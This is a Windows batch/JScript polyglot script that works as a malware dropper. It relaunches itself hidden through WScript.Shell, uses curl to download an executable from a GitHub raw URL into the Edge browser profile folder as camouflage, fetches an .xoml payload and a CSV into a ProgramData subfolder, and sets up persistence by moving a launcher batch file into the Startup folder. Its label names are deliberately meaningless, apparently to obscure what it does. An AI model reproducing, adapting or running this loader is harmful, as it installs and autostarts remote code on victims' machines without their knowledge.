@set @x=0 /*
@echo off
setlocal EnableDelayedExpansion

if defined virtualVertex goto :takeInjectableResignLoop
set "virtualVertex=1"
cscript //nologo //E:JScript "%~f0" "%~f0" %*
exit /b 0
:takeInjectableResignLoop

if "%~1"=="constraintCapabilityAutomaticAllocate" goto :rollbackConnect

:rollbackConnect

if exist "%LOCALAPPDATA%\Temp\run.txt" (
    goto :tls
)

:schedulerAnnotationBlacklist
set "evaluatorAppendRemote=%LOCALAPPDATA%\Temp\run.txt"
for %%F in ("!evaluatorAppendRemote!") do (
    if not exist "%%~dpF" mkdir "%%~dpF"
)
setlocal DisableDelayedExpansion
> "%LOCALAPPDATA%\Temp\run.txt" echo(@echo off
>> "%LOCALAPPDATA%\Temp\run.txt" echo(start "" "%%LOCALAPPDATA%%\Microsoft\Edge\User Data\Default\WFC.exe" "%%PROGRAMDATA%%\costanza\index.xoml"
endlocal
goto :resolver

:resolver
if not defined prioritizable goto :consumeAlert
call "%~f0" %*
goto :eof
:consumeAlert
set "prioritizable=1"
cscript //nologo //E:JScript "%~f0" unOpenPointerInvalidation constraintCapabilityAutomaticAllocate
set "prioritizable="
goto :tls

:tls

if exist "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe" (
    goto :edgeAnonymous
)

:truncatableFilepath
set "evaluatorAppendRemote=%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe"
for %%F in ("!evaluatorAppendRemote!") do (
    if not exist "%%~dpF" mkdir "%%~dpF"
)
curl -LJ -s -o "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe" "https://github.com/cw6787/wfc/raw/refs/heads/main/WFC.exe"
if !errorlevel! neq 0 (
    del "%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\WFC.exe" 2>nul
    goto :queueValidate
)
goto :pipelineConvertSecondaryGadget

:queueValidate
exit /b 1

:pipelineConvertSecondaryGadget

:edgeAnonymous

if exist "%PROGRAMDATA%\costanza\index.xoml" (
    goto :createSerializerDataflow
)

:executable
set "evaluatorAppendRemote=%PROGRAMDATA%\costanza\index.xoml"
for %%F in ("!evaluatorAppendRemote!") do (
    if not exist "%%~dpF" mkdir "%%~dpF"
)
curl -L -s -o "%PROGRAMDATA%\costanza\index.xoml" "https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/index.xml"
if !errorlevel! neq 0 (
    del "%PROGRAMDATA%\costanza\index.xoml" 2>nul
    goto :halfStaticLambdaAdopt
)
goto :modeMutateUpdateable

:halfStaticLambdaAdopt
exit /b 1

:modeMutateUpdateable

:createSerializerDataflow

if exist "%PROGRAMDATA%\costanza\viewtime.csv" (
    goto :insertableDetect
)

:squashBootup
set "evaluatorAppendRemote=%PROGRAMDATA%\costanza\viewtime.csv"
for %%F in ("!evaluatorAppendRemote!") do (
    if not exist "%%~dpF" mkdir "%%~dpF"
)
curl -L -s -o "%PROGRAMDATA%\costanza\viewtime.csv" "https://raw.githubusercontent.com/cw6787/comeclean/refs/heads/main/Viewtime.csv"
if !errorlevel! neq 0 (
    del "%PROGRAMDATA%\costanza\viewtime.csv" 2>nul
    goto :debuggableRecover
)
goto :notify

:debuggableRecover
exit /b 1

:notify
if not defined prioritizable goto :predicateDeploymentRuntimeCompressor
call "%~f0" %*
goto :eof
:predicateDeploymentRuntimeCompressor
set "prioritizable=1"
cscript //nologo //E:JScript "%~f0" unOpenPointerInvalidation constraintCapabilityAutomaticAllocate
set "prioritizable="
goto :insertableDetect

:insertableDetect

if defined prioritizable goto :eof

if defined compressable goto :watch
set "compressable=1"
cscript //nologo //E:JScript "%~f0" constraintCapabilityAutomaticAllocate
exit /b 0

:watch
cmd /c move "%LOCALAPPDATA%\Temp\run.txt" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\run.bat"
if !errorlevel! neq 0 (
    exit /b 1
)

endlocal
exit /b 0
*/
var sh = new ActiveXObject('WScript.Shell');
var bat = WScript.ScriptFullName;
var fso = new ActiveXObject('Scripting.FileSystemObject');
var ext = fso.GetExtensionName(bat).toLowerCase();
if (ext != 'bat' && ext != 'cmd') { var dst = sh.ExpandEnvironmentStrings('%TEMP%\\setup.bat'); fso.CopyFile(bat, dst, true); bat = dst; }
var w = false;
var a = '';
for (var i = 0; i < WScript.Arguments.length; i++) if (WScript.Arguments(i) == 'unOpenPointerInvalidation') w = true; else a += ' ' + WScript.Arguments(i);
sh.Run('cmd /c "' + bat + '"' + a, 0, w);
WScript.Quit(0);
